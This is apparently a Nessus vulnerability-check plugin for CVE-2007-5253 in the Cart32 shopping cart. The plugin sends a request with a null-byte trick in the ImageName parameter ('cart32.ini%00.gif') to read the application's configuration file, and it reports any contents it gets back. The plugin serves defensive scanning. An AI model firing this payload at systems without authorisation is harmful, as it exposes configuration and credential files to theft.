#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(26924);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2007-5253");
  script_bugtraq_id(25928);
  script_osvdb_id(38580);

  script_name(english:"Cart32 c32web.exe ImageName Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve Cart32's config file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"Cart32, a shopping cart application, is installed on the remote host. 

The remote installation of Cart32 fails to sufficiently validate input
to the 'GetImage' function of 'c32web.exe' script before returning the
contents of arbitrary files, not just image files as intended.  An
unauthenticated, remote attacker can exploit this issue to retrieve
arbitrary files, such as the application's configuration or database
files." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/481489/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Cart32 version 6.4 as that version reportedly resolves the
issue." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/10/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/10/04");
 script_cvs_date("$Date: 2016/05/04 14:30:40 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/shr-cgi-bin", "/store", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve Cart32's config file.
  file = "cart32.ini";

  r = http_send_recv3(method:"GET", port:port,
    item:string(dir, "/c32web.exe/GetImage?",
      "ImageName=", file, "%00.gif") );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if it looks like the config file.
  if (
    "Cart32" >< res &&
    "C32WebName=" >< res
  )
  {
    report = string(
      "\n",
      "Here are the contents of Cart32's configuration file that Nessus was\n",
      "able to read from the remote host :\n",
      "\n",
      res
    );
    security_warning(port:port, extra:report);
    exit(0);
  }
}
